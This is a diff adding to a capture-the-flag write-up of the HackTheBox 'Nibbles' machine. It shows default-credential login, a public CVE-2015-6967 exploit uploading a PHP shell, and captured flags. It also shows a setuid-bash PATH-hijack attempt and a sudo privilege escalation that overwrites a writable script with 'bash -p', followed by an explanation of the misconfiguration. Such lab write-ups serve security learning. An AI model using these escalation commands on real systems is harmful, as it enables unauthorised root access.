@@ -352,9 +352,88 @@ http://10.10.10.75/nibbleblog/install.php
 admin
 nibbles
 ```
+Tried default creds:  
+**Username:** `admin`  
+**Password:** `nibbles`  
+
 
 https://github.com/dix0nym/CVE-2015-6967
 ```
 exploit.py --url 10.10.10.75 --username admin --password nibbles --payload shell.php
 ```
 
+
+```
+$ cd nibbler
+$ ls
+personal.zip
+user.txt
+$ cat user.txt
+2db86b8a9793df0b7fd9e0c1286c01ec
+```
+
+```
+sudo -l
+User nibbler may run the following commands on Nibbles:
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+Tried to hijack commands like `curl` and `ping` via:
+```
+PATH=.:$PATH sudo /home/nibbler/personal/stuff/monitor.sh
+```
+Placed fake binaries in the current directory:
+```
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
+
+Didn’t work — script never hit those commands due to how its logic branches were structured. `$#` was never 0, so the good code block never executed.
+
+### Working Exploit: Script Overwrite
+Since I could run the script with `sudo` and had write access to it, I replaced it entirely:
+
+```
+echo '#!/bin/bash' > /tmp/rootme.sh
+echo 'bash -p' >> /tmp/rootme.sh
+chmod +x /tmp/rootme.sh
+cp /tmp/rootme.sh /home/nibbler/personal/stuff/monitor.sh
+```
+Then escalated:
+```
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+```
+cd /root
+cat root.txt
+e56b0e20713f1937b8464b4d5c3f7700
+```
+
+
+
+The user `nibbler` is allowed to run the script `/home/nibbler/personal/stuff/monitor.sh` as **root** without entering a password. This is defined by the `sudo` configuration:
+```
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+That alone isn’t a problem — unless the user also has permission to edit that script.
+
+In this case, nibbler owns the script or has write access to it. That means they can change its contents to anything they want, and then run it as root using sudo.
+
+### What in the script allows this?
+
+The problem isn’t the content of the script itself — the real issue is that the script is both:
+
+1. **Writable by a non-root user**, and
+2. **Executable as root using sudo without a password**.
+
+Even though the original script contains logic and checks (like using `ping`, `curl`, etc.), none of that matters. The attacker can **replace the entire script** with a simple payload like:
+
+```
+#!/bin/bash
+bash -p
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+will start a new shell with **root privileges**.
